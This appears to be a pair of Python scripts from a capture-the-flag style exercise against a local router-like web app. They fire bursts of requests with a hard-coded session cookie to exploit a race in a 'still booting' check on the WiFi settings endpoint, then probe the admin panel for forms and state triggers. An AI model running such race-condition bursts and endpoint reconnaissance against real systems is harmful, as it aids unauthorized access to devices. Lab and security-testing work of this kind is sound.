import requests
import time
import statistics

# Target configuration
url = "http://127.0.0.1:32992/wifi_settings"
cookies = {"session": "ahYINfgSeZIuIVlIHpUK5jZSk4ahE5y7ZFvZds3KuA8"}
data = {"ssid": "TestRace", "password": "race1234"}

session = requests.Session()

# First, let's try EXTREME rapid-fire - minimize time between requests
# And also try testing with GET first to see the endpoint state

print("[=] PHASE 1: Checking endpoint with GET request")
resp = session.get(url, cookies=cookies, timeout=10)
print(f"  GET Status: {resp.status_code}")
print(f"  Contains 'booting': {'still booting' in resp.text.lower()}")

print("\n[=] PHASE 2: Testing rapid request bursts with different intervals")
# Test with varying burst sizes and timing

results_all = []

for burst_num in range(5):
    print(f"\n  Burst #{burst_num + 1}:")
    burst_results = []
    start_burst = time.perf_counter()
    
    for i in range(30):  # 30 requests per burst
        req_start = time.perf_counter()
        try:
            response = session.post(
                url,
                cookies=cookies,
                data=data,
                timeout=10,
                allow_redirects=False
            )
            elapsed = (time.perf_counter() - req_start) * 1000
            burst_results.append({
                "id": f"{burst_num}-{i}",
                "status": response.status_code,
                "body": response.text,
                "time_ms": elapsed,
                "success": "still booting" not in response.text.lower()
            })
        except Exception as e:
            elapsed = (time.perf_counter() - req_start) * 1000
            burst_results.append({
                "id": f"{burst_num}-{i}",
                "status": None,
                "error": str(e),
                "time_ms": elapsed,
                "success": False
            })
    
    end_burst = time.perf_counter()
    burst_time = end_burst - start_burst
    
    # Analyze burst
    successes = [r for r in burst_results if r.get('success')]
    failures = [r for r in burst_results if not r.get('success')]
    
    print(f"    Duration: {burst_time:.3f}s, Successes: {len(successes)}/30")
    
    if successes:
        print(f"    [!] FOUND SUCCESSFUL REQUESTS!")
        for s in successes[:3]:
            print(f"      Request {s['id']}: Status={s['status']}, Time={s['time_ms']:.2f}ms")
            print(f"      Body preview: {s['body'][:300]}")
    
    results_all.extend(burst_results)
    time.sleep(0.1)  # Small delay between bursts

# Final analysis
print("\n" + "="*60)
print("OVERALL RESULTS")
print("="*60)

all_successes = [r for r in results_all if r.get('success')]
all_failures = [r for r in results_all if not r.get('success')]

print(f"Total requests: {len(results_all)}")
print(f"Successes (no booting error): {len(all_successes)}")
print(f"Booting errors: {len(all_failures)}")

if all_successes:
    print(f"\n[!] RACE CONDITION DETECTED!")
    print(f"Successful requests found!")
    for s in all_successes[:5]:
        print(f"\n  Request {s['id']}:")
        print(f"  Status: {s['status']}")
        print(f"  Time: {s['time_ms']:.2f}ms")
        print(f"  Body: {s['body'][:500]}")
else:
    print(f"\n[-] All requests returned booting error")
    print(f"The boot state appears to be locked in 'booting' mode")
    print(f"This suggests either:")
    print(f"  1. The boot state never transitions in this test setup")
    print(f"  2. There is no race window to exploit")
    print(f"  3. The race window requires triggering a state change first")

# Check if any responses had different content
unique_bodies = set(r.get('body', '')[:200] for r in results_all if 'body' in r)
print(f"\nUnique response body patterns: {len(unique_bodies)}")
if len(unique_bodies) == 1:
    print("All responses were identical - no variation detected")

import requests

# Target configuration
base_url = "http://127.0.0.1:32992"
cookies = {"session": "ahYINfgSeZIuIVlIHpUK5jZSk4ahE5y7ZFvZds3KuA8"}

session = requests.Session()

# Check all discovered endpoints and their response to various methods
endpoints_to_check = [
    "/dashboard",
    "/wifi_settings",
    "/admin_panel",
    "/logout"
]

print("[=] ENDPOINT RECONNAISSANCE")
print("="*60)

for endpoint in endpoints_to_check:
    url = f"{base_url}{endpoint}"
    print(f"\n[+] Testing {endpoint}")
    
    # Test GET
    try:
        get_resp = session.get(url, cookies=cookies, timeout=10, allow_redirects=False)
        print(f"  GET: Status={get_resp.status_code}, Len={len(get_resp.text)}")
        has_booting = "still booting" in get_resp.text.lower()
        print(f"       Booting message: {has_booting}")
        
        # Look for interesting links or forms
        if "href=" in get_resp.text:
            import re
            links = re.findall(r'href="([^"]+)"', get_resp.text)
            unique_links = set(links)
            print(f"       Links found: {list(unique_links)[:5]}")
    except Exception as e:
        print(f"  GET: Error - {e}")
    
    # Test POST (for endpoints that might accept it)
    if endpoint != "/logout":
        try:
            post_resp = session.post(url, cookies=cookies, data={"test": "value"}, timeout=10, allow_redirects=False)
            print(f"  POST: Status={post_resp.status_code}, Len={len(post_resp.text)}")
            has_booting = "still booting" in post_resp.text.lower()
            print(f"        Booting message: {has_booting}")
        except Exception as e:
            print(f"  POST: Error - {e}")

# Focus on admin_panel - check if it has reset or special functions
print("\n" + "="*60)
print("[ADMIN PANEL ANALYSIS]")
url = f"{base_url}/admin_panel"
resp = session.get(url, cookies=cookies, timeout=10)
print(f"Status: {resp.status_code}")
print(f"Length: {len(resp.text)}")

# Check for forms, buttons, or special functions
if "form" in resp.text.lower():
    import re
    forms = re.findall(r'<form[^>]*>.*?</form>', resp.text, re.DOTALL | re.IGNORECASE)
    print(f"\nForms found: {len(forms)}")
    for i, form in enumerate(forms[:3]):
        print(f"\nForm {i+1}:")
        print(form[:500])

# Check for any boot/control related elements
boot_keywords = ['boot', 'reset', 'restart', 'chipset', 'wifi', 'reload']
for keyword in boot_keywords:
    if keyword in resp.text.lower():
        print(f"\n[!] Found '{keyword}' in admin panel")
        # Find context
        idx = resp.text.lower().find(keyword)
        context = resp.text[max(0, idx-100):min(len(resp.text), idx+100)]
        print(f"Context: ...{context}...")

# Check if there's any way to trigger a state change
print("\n" + "="*60)
print("[STATE CHANGE TRIGGER ANALYSIS]")

# Try triggering different actions and then test wifi_settings
test_sequence = [
    ("Visit dashboard", lambda: session.get(f"{base_url}/dashboard", cookies=cookies)),
    ("Visit admin_panel", lambda: session.get(f"{base_url}/admin_panel", cookies=cookies)),
]

for desc, action in test_sequence:
    print(f"\n[+] {desc}")
    try:
        action()
        # Immediately test wifi_settings
        wifi_resp = session.post(
            f"{base_url}/wifi_settings",
            cookies=cookies,
            data={"ssid": "Test", "password": "test123"},
            timeout=10
        )
        has_booting = "still booting" in wifi_resp.text.lower()
        print(f"  After {desc}: Booting={has_booting}")
    except Exception as e:
        print(f"  Error: {e}")

# Show full admin panel HTML for analysis
print("\n" + "="*60)
print("[FULL ADMIN PANEL HTML]")
resp = session.get(f"{base_url}/admin_panel", cookies=cookies, timeout=10)
print(resp.text)

